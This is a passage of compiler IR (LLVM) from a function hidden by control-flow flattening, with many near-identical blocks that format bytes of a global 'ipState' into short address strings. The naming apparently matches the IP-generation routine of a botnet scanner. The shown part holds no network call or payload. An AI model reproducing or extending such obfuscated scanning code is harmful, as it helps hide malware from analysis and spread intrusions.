  %1260 = load i32, i32* %1, align 4
  %1261 = icmp eq i32 %1260, 112
  %1262 = select i1 %1261, i32 1597317165, i32 342868125
  store i32 %1262, i32* %switchVar
  br label %loopEnd

; <label>:1263:                                   ; preds = %loopEntry
  %1264 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1265 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1266 = zext i8 %1265 to i32
  %1267 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1268 = zext i8 %1267 to i32
  %1269 = call i32 (i8*, i8*, ...) @szprintf(i8* %1264, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.149, i32 0, i32 0), i32 %1266, i32 %1268)
  store i32 342868125, i32* %switchVar
  br label %loopEnd

; <label>:1270:                                   ; preds = %loopEntry
  %1271 = load i32, i32* %1, align 4
  %1272 = icmp eq i32 %1271, 113
  %1273 = select i1 %1272, i32 -636021309, i32 -123623665
  store i32 %1273, i32* %switchVar
  br label %loopEnd

; <label>:1274:                                   ; preds = %loopEntry
  %1275 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1276 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1277 = zext i8 %1276 to i32
  %1278 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1279 = zext i8 %1278 to i32
  %1280 = call i32 (i8*, i8*, ...) @szprintf(i8* %1275, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.150, i32 0, i32 0), i32 %1277, i32 %1279)
  store i32 -123623665, i32* %switchVar
  br label %loopEnd

; <label>:1281:                                   ; preds = %loopEntry
  %1282 = load i32, i32* %1, align 4
  %1283 = icmp eq i32 %1282, 114
  %1284 = select i1 %1283, i32 -1780042729, i32 -1131001102
  store i32 %1284, i32* %switchVar
  br label %loopEnd

; <label>:1285:                                   ; preds = %loopEntry
  %1286 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1287 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1288 = zext i8 %1287 to i32
  %1289 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1290 = zext i8 %1289 to i32
  %1291 = call i32 (i8*, i8*, ...) @szprintf(i8* %1286, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.151, i32 0, i32 0), i32 %1288, i32 %1290)
  store i32 -1131001102, i32* %switchVar
  br label %loopEnd

; <label>:1292:                                   ; preds = %loopEntry
  %1293 = load i32, i32* %1, align 4
  %1294 = icmp eq i32 %1293, 115
  %1295 = select i1 %1294, i32 -281490346, i32 -777003905
  store i32 %1295, i32* %switchVar
  br label %loopEnd

; <label>:1296:                                   ; preds = %loopEntry
  %1297 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1298 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1299 = zext i8 %1298 to i32
  %1300 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1301 = zext i8 %1300 to i32
  %1302 = call i32 (i8*, i8*, ...) @szprintf(i8* %1297, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.152, i32 0, i32 0), i32 %1299, i32 %1301)
  store i32 -777003905, i32* %switchVar
  br label %loopEnd

; <label>:1303:                                   ; preds = %loopEntry
  %1304 = load i32, i32* %1, align 4
  %1305 = icmp eq i32 %1304, 116
  %1306 = select i1 %1305, i32 -1504530583, i32 -699588222
  store i32 %1306, i32* %switchVar
  br label %loopEnd

; <label>:1307:                                   ; preds = %loopEntry
  %1308 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1309 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1310 = zext i8 %1309 to i32
  %1311 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1312 = zext i8 %1311 to i32
  %1313 = call i32 (i8*, i8*, ...) @szprintf(i8* %1308, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.153, i32 0, i32 0), i32 %1310, i32 %1312)
  store i32 -699588222, i32* %switchVar
  br label %loopEnd

; <label>:1314:                                   ; preds = %loopEntry
  %1315 = load i32, i32* %1, align 4
  %1316 = icmp eq i32 %1315, 117
  %1317 = select i1 %1316, i32 192822647, i32 -689281279
  store i32 %1317, i32* %switchVar
  br label %loopEnd

; <label>:1318:                                   ; preds = %loopEntry
  %1319 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1320 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1321 = zext i8 %1320 to i32
  %1322 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1323 = zext i8 %1322 to i32
  %1324 = call i32 (i8*, i8*, ...) @szprintf(i8* %1319, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.154, i32 0, i32 0), i32 %1321, i32 %1323)
  store i32 -689281279, i32* %switchVar
  br label %loopEnd

; <label>:1325:                                   ; preds = %loopEntry
  %1326 = load i32, i32* %1, align 4
  %1327 = icmp eq i32 %1326, 118
  %1328 = select i1 %1327, i32 52401347, i32 -1186604818
  store i32 %1328, i32* %switchVar
  br label %loopEnd

; <label>:1329:                                   ; preds = %loopEntry
  %1330 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1331 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1332 = zext i8 %1331 to i32
  %1333 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1334 = zext i8 %1333 to i32
  %1335 = call i32 (i8*, i8*, ...) @szprintf(i8* %1330, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.155, i32 0, i32 0), i32 %1332, i32 %1334)
  store i32 -1186604818, i32* %switchVar
  br label %loopEnd

; <label>:1336:                                   ; preds = %loopEntry
  %1337 = load i32, i32* %1, align 4
  %1338 = icmp eq i32 %1337, 119
  %1339 = select i1 %1338, i32 -974746438, i32 1384606725
  store i32 %1339, i32* %switchVar
  br label %loopEnd

; <label>:1340:                                   ; preds = %loopEntry
  %1341 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1342 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1343 = zext i8 %1342 to i32
  %1344 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1345 = zext i8 %1344 to i32
  %1346 = call i32 (i8*, i8*, ...) @szprintf(i8* %1341, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.156, i32 0, i32 0), i32 %1343, i32 %1345)
  store i32 1384606725, i32* %switchVar
  br label %loopEnd

; <label>:1347:                                   ; preds = %loopEntry
  %1348 = load i32, i32* %1, align 4
  %1349 = icmp eq i32 %1348, 120
  %1350 = select i1 %1349, i32 1696081372, i32 1528613543
  store i32 %1350, i32* %switchVar
  br label %loopEnd

; <label>:1351:                                   ; preds = %loopEntry
  %1352 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1353 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1354 = zext i8 %1353 to i32
  %1355 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1356 = zext i8 %1355 to i32
  %1357 = call i32 (i8*, i8*, ...) @szprintf(i8* %1352, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.157, i32 0, i32 0), i32 %1354, i32 %1356)
  store i32 1528613543, i32* %switchVar
  br label %loopEnd

; <label>:1358:                                   ; preds = %loopEntry
  %1359 = load i32, i32* %1, align 4
  %1360 = icmp eq i32 %1359, 121
  %1361 = select i1 %1360, i32 -1853795652, i32 -438109201
  store i32 %1361, i32* %switchVar
  br label %loopEnd

; <label>:1362:                                   ; preds = %loopEntry
  %1363 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1364 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1365 = zext i8 %1364 to i32
  %1366 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1367 = zext i8 %1366 to i32
  %1368 = call i32 (i8*, i8*, ...) @szprintf(i8* %1363, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.158, i32 0, i32 0), i32 %1365, i32 %1367)
  store i32 -438109201, i32* %switchVar
  br label %loopEnd

; <label>:1369:                                   ; preds = %loopEntry
  %1370 = load i32, i32* %1, align 4
  %1371 = icmp eq i32 %1370, 122
  %1372 = select i1 %1371, i32 -1773672310, i32 -612892161
  store i32 %1372, i32* %switchVar
  br label %loopEnd

; <label>:1373:                                   ; preds = %loopEntry
  %1374 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1375 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1376 = zext i8 %1375 to i32
  %1377 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1378 = zext i8 %1377 to i32
  %1379 = call i32 (i8*, i8*, ...) @szprintf(i8* %1374, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.159, i32 0, i32 0), i32 %1376, i32 %1378)
  store i32 -612892161, i32* %switchVar
  br label %loopEnd

; <label>:1380:                                   ; preds = %loopEntry
  %1381 = load i32, i32* %1, align 4
  %1382 = icmp eq i32 %1381, 123
  %1383 = select i1 %1382, i32 539841695, i32 754014497
  store i32 %1383, i32* %switchVar
  br label %loopEnd

; <label>:1384:                                   ; preds = %loopEntry
  %1385 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1386 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1387 = zext i8 %1386 to i32
  %1388 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1389 = zext i8 %1388 to i32
  %1390 = call i32 (i8*, i8*, ...) @szprintf(i8* %1385, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.160, i32 0, i32 0), i32 %1387, i32 %1389)
  store i32 754014497, i32* %switchVar
  br label %loopEnd

; <label>:1391:                                   ; preds = %loopEntry
  %1392 = load i32, i32* %1, align 4
  %1393 = icmp eq i32 %1392, 124
  %1394 = select i1 %1393, i32 984640344, i32 1361365703
  store i32 %1394, i32* %switchVar
  br label %loopEnd

; <label>:1395:                                   ; preds = %loopEntry
  %1396 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1397 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1398 = zext i8 %1397 to i32
  %1399 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1400 = zext i8 %1399 to i32
  %1401 = call i32 (i8*, i8*, ...) @szprintf(i8* %1396, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.161, i32 0, i32 0), i32 %1398, i32 %1400)
  store i32 1361365703, i32* %switchVar
  br label %loopEnd

; <label>:1402:                                   ; preds = %loopEntry
  %1403 = load i32, i32* %1, align 4
  %1404 = icmp eq i32 %1403, 125
  %1405 = select i1 %1404, i32 -138281709, i32 234364011
  store i32 %1405, i32* %switchVar
  br label %loopEnd

; <label>:1406:                                   ; preds = %loopEntry
  %1407 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1408 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1409 = zext i8 %1408 to i32
  %1410 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1411 = zext i8 %1410 to i32
  %1412 = call i32 (i8*, i8*, ...) @szprintf(i8* %1407, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.162, i32 0, i32 0), i32 %1409, i32 %1411)
  store i32 234364011, i32* %switchVar
  br label %loopEnd

; <label>:1413:                                   ; preds = %loopEntry
  %1414 = load i32, i32* %1, align 4
  %1415 = icmp eq i32 %1414, 126
  %1416 = select i1 %1415, i32 1824402580, i32 -66376768
  store i32 %1416, i32* %switchVar
  br label %loopEnd

; <label>:1417:                                   ; preds = %loopEntry
  %1418 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1419 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1420 = zext i8 %1419 to i32
  %1421 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1422 = zext i8 %1421 to i32
  %1423 = call i32 (i8*, i8*, ...) @szprintf(i8* %1418, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.163, i32 0, i32 0), i32 %1420, i32 %1422)
  store i32 -66376768, i32* %switchVar
  br label %loopEnd

; <label>:1424:                                   ; preds = %loopEntry
  %1425 = load i32, i32* %1, align 4
  %1426 = icmp eq i32 %1425, 127
  %1427 = select i1 %1426, i32 1691113668, i32 1855172739
  store i32 %1427, i32* %switchVar
  br label %loopEnd

; <label>:1428:                                   ; preds = %loopEntry
  %1429 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1430 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1431 = zext i8 %1430 to i32
  %1432 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1433 = zext i8 %1432 to i32
  %1434 = call i32 (i8*, i8*, ...) @szprintf(i8* %1429, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.153, i32 0, i32 0), i32 %1431, i32 %1433)
  store i32 1855172739, i32* %switchVar
  br label %loopEnd

; <label>:1435:                                   ; preds = %loopEntry
  %1436 = load i32, i32* %1, align 4
  %1437 = icmp eq i32 %1436, 128
  %1438 = select i1 %1437, i32 1213482376, i32 -624468660
  store i32 %1438, i32* %switchVar
  br label %loopEnd

; <label>:1439:                                   ; preds = %loopEntry
  %1440 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1441 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1442 = zext i8 %1441 to i32
  %1443 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1444 = zext i8 %1443 to i32
  %1445 = call i32 (i8*, i8*, ...) @szprintf(i8* %1440, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.164, i32 0, i32 0), i32 %1442, i32 %1444)
  store i32 -624468660, i32* %switchVar
  br label %loopEnd

; <label>:1446:                                   ; preds = %loopEntry
  %1447 = load i32, i32* %1, align 4
  %1448 = icmp eq i32 %1447, 129
  %1449 = select i1 %1448, i32 1423139188, i32 -444246655
  store i32 %1449, i32* %switchVar
  br label %loopEnd

; <label>:1450:                                   ; preds = %loopEntry
  %1451 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1452 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1453 = zext i8 %1452 to i32
  %1454 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1455 = zext i8 %1454 to i32
  %1456 = call i32 (i8*, i8*, ...) @szprintf(i8* %1451, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.165, i32 0, i32 0), i32 %1453, i32 %1455)
  store i32 -444246655, i32* %switchVar
  br label %loopEnd

; <label>:1457:                                   ; preds = %loopEntry
  %1458 = load i32, i32* %1, align 4
  %1459 = icmp eq i32 %1458, 130
  %1460 = select i1 %1459, i32 -1760254050, i32 984205075
  store i32 %1460, i32* %switchVar
  br label %loopEnd

; <label>:1461:                                   ; preds = %loopEntry
  %1462 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1463 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1464 = zext i8 %1463 to i32
  %1465 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1466 = zext i8 %1465 to i32
  %1467 = call i32 (i8*, i8*, ...) @szprintf(i8* %1462, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.159, i32 0, i32 0), i32 %1464, i32 %1466)
  store i32 984205075, i32* %switchVar
  br label %loopEnd

; <label>:1468:                                   ; preds = %loopEntry
  %1469 = load i32, i32* %1, align 4
  %1470 = icmp eq i32 %1469, 131
  %1471 = select i1 %1470, i32 266455108, i32 -702991579
  store i32 %1471, i32* %switchVar
  br label %loopEnd

; <label>:1472:                                   ; preds = %loopEntry
  %1473 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1474 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1475 = zext i8 %1474 to i32
  %1476 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1477 = zext i8 %1476 to i32
  %1478 = call i32 (i8*, i8*, ...) @szprintf(i8* %1473, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.166, i32 0, i32 0), i32 %1475, i32 %1477)
  store i32 -702991579, i32* %switchVar
  br label %loopEnd

; <label>:1479:                                   ; preds = %loopEntry
  %1480 = load i32, i32* %1, align 4
  %1481 = icmp eq i32 %1480, 132
  %1482 = select i1 %1481, i32 2002444611, i32 -851340953
  store i32 %1482, i32* %switchVar
  br label %loopEnd

; <label>:1483:                                   ; preds = %loopEntry
  %1484 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1485 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1486 = zext i8 %1485 to i32
  %1487 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1488 = zext i8 %1487 to i32
  %1489 = call i32 (i8*, i8*, ...) @szprintf(i8* %1484, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.167, i32 0, i32 0), i32 %1486, i32 %1488)
  store i32 -851340953, i32* %switchVar
  br label %loopEnd

; <label>:1490:                                   ; preds = %loopEntry
  %1491 = load i32, i32* %1, align 4
  %1492 = icmp eq i32 %1491, 133
  %1493 = select i1 %1492, i32 -80448585, i32 1180308803
  store i32 %1493, i32* %switchVar
  br label %loopEnd

; <label>:1494:                                   ; preds = %loopEntry
  %1495 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1496 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1497 = zext i8 %1496 to i32
  %1498 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1499 = zext i8 %1498 to i32
  %1500 = call i32 (i8*, i8*, ...) @szprintf(i8* %1495, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.168, i32 0, i32 0), i32 %1497, i32 %1499)
  store i32 1180308803, i32* %switchVar
  br label %loopEnd

; <label>:1501:                                   ; preds = %loopEntry
  %1502 = load i32, i32* %1, align 4
  %1503 = icmp eq i32 %1502, 134
  %1504 = select i1 %1503, i32 232815045, i32 -1572292043
  store i32 %1504, i32* %switchVar
  br label %loopEnd

; <label>:1505:                                   ; preds = %loopEntry
  %1506 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1507 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1508 = zext i8 %1507 to i32
  %1509 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1510 = zext i8 %1509 to i32
  %1511 = call i32 (i8*, i8*, ...) @szprintf(i8* %1506, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.169, i32 0, i32 0), i32 %1508, i32 %1510)
  store i32 -1572292043, i32* %switchVar
  br label %loopEnd

; <label>:1512:                                   ; preds = %loopEntry
  %1513 = load i32, i32* %1, align 4
  %1514 = icmp eq i32 %1513, 135
  %1515 = select i1 %1514, i32 405974639, i32 391953876
  store i32 %1515, i32* %switchVar
  br label %loopEnd

; <label>:1516:                                   ; preds = %loopEntry
  %1517 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1518 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1519 = zext i8 %1518 to i32
  %1520 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1521 = zext i8 %1520 to i32
  %1522 = call i32 (i8*, i8*, ...) @szprintf(i8* %1517, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.170, i32 0, i32 0), i32 %1519, i32 %1521)
  store i32 391953876, i32* %switchVar
  br label %loopEnd

; <label>:1523:                                   ; preds = %loopEntry
  %1524 = load i32, i32* %1, align 4
  %1525 = icmp eq i32 %1524, 136
  %1526 = select i1 %1525, i32 -2026415178, i32 -1981372409
  store i32 %1526, i32* %switchVar
  br label %loopEnd

; <label>:1527:                                   ; preds = %loopEntry
  %1528 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1529 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1530 = zext i8 %1529 to i32
  %1531 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1532 = zext i8 %1531 to i32
  %1533 = call i32 (i8*, i8*, ...) @szprintf(i8* %1528, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.171, i32 0, i32 0), i32 %1530, i32 %1532)
  store i32 -1981372409, i32* %switchVar
  br label %loopEnd

; <label>:1534:                                   ; preds = %loopEntry
  %1535 = load i32, i32* %1, align 4
  %1536 = icmp eq i32 %1535, 137
  %1537 = select i1 %1536, i32 -2130282475, i32 -1539716234
  store i32 %1537, i32* %switchVar
  br label %loopEnd

; <label>:1538:                                   ; preds = %loopEntry
  %1539 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1540 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1541 = zext i8 %1540 to i32
  %1542 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1543 = zext i8 %1542 to i32
  %1544 = call i32 (i8*, i8*, ...) @szprintf(i8* %1539, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.172, i32 0, i32 0), i32 %1541, i32 %1543)
  store i32 -1539716234, i32* %switchVar
  br label %loopEnd

; <label>:1545:                                   ; preds = %loopEntry
  %1546 = load i32, i32* %1, align 4
  %1547 = icmp eq i32 %1546, 138
  %1548 = select i1 %1547, i32 173308822, i32 1206821203
  store i32 %1548, i32* %switchVar
  br label %loopEnd

; <label>:1549:                                   ; preds = %loopEntry
  %1550 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1551 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1552 = zext i8 %1551 to i32
  %1553 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1554 = zext i8 %1553 to i32
  %1555 = call i32 (i8*, i8*, ...) @szprintf(i8* %1550, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.173, i32 0, i32 0), i32 %1552, i32 %1554)
  store i32 1206821203, i32* %switchVar
  br label %loopEnd

; <label>:1556:                                   ; preds = %loopEntry
  %1557 = load i32, i32* %1, align 4
  %1558 = icmp eq i32 %1557, 139
  %1559 = select i1 %1558, i32 -524581998, i32 -914929910
  store i32 %1559, i32* %switchVar
  br label %loopEnd

; <label>:1560:                                   ; preds = %loopEntry
  %1561 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1562 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1563 = zext i8 %1562 to i32
  %1564 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1565 = zext i8 %1564 to i32
  %1566 = call i32 (i8*, i8*, ...) @szprintf(i8* %1561, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.174, i32 0, i32 0), i32 %1563, i32 %1565)
  store i32 -914929910, i32* %switchVar
  br label %loopEnd

; <label>:1567:                                   ; preds = %loopEntry
  %1568 = load i32, i32* %1, align 4
  %1569 = icmp eq i32 %1568, 140
  %1570 = select i1 %1569, i32 -1212199824, i32 -541826049
  store i32 %1570, i32* %switchVar
  br label %loopEnd

; <label>:1571:                                   ; preds = %loopEntry
  %1572 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1573 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1574 = zext i8 %1573 to i32
  %1575 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1576 = zext i8 %1575 to i32
  %1577 = call i32 (i8*, i8*, ...) @szprintf(i8* %1572, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.175, i32 0, i32 0), i32 %1574, i32 %1576)
  store i32 -541826049, i32* %switchVar
  br label %loopEnd

; <label>:1578:                                   ; preds = %loopEntry
  %1579 = load i32, i32* %1, align 4
  %1580 = icmp eq i32 %1579, 141
  %1581 = select i1 %1580, i32 1892470502, i32 -1220703231
  store i32 %1581, i32* %switchVar
  br label %loopEnd

; <label>:1582:                                   ; preds = %loopEntry
  %1583 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1584 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1585 = zext i8 %1584 to i32
  %1586 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1587 = zext i8 %1586 to i32
  %1588 = call i32 (i8*, i8*, ...) @szprintf(i8* %1583, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.176, i32 0, i32 0), i32 %1585, i32 %1587)
  store i32 -1220703231, i32* %switchVar
  br label %loopEnd

; <label>:1589:                                   ; preds = %loopEntry
  %1590 = load i32, i32* %1, align 4
  %1591 = icmp eq i32 %1590, 142
  %1592 = select i1 %1591, i32 -979531739, i32 696818140
  store i32 %1592, i32* %switchVar
  br label %loopEnd

; <label>:1593:                                   ; preds = %loopEntry
  %1594 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1595 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1596 = zext i8 %1595 to i32
  %1597 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1598 = zext i8 %1597 to i32
  %1599 = call i32 (i8*, i8*, ...) @szprintf(i8* %1594, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.177, i32 0, i32 0), i32 %1596, i32 %1598)
  store i32 696818140, i32* %switchVar
  br label %loopEnd

; <label>:1600:                                   ; preds = %loopEntry
  %1601 = load i32, i32* %1, align 4
  %1602 = icmp eq i32 %1601, 143
  %1603 = select i1 %1602, i32 972235229, i32 -1843374991
  store i32 %1603, i32* %switchVar
  br label %loopEnd

; <label>:1604:                                   ; preds = %loopEntry
  %1605 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1606 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1607 = zext i8 %1606 to i32
  %1608 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1609 = zext i8 %1608 to i32
  %1610 = call i32 (i8*, i8*, ...) @szprintf(i8* %1605, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.178, i32 0, i32 0), i32 %1607, i32 %1609)
  store i32 -1843374991, i32* %switchVar
  br label %loopEnd

; <label>:1611:                                   ; preds = %loopEntry
  %1612 = load i32, i32* %1, align 4
  %1613 = icmp eq i32 %1612, 144
  %1614 = select i1 %1613, i32 -664344919, i32 -2093276989
  store i32 %1614, i32* %switchVar
  br label %loopEnd

; <label>:1615:                                   ; preds = %loopEntry
  %1616 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
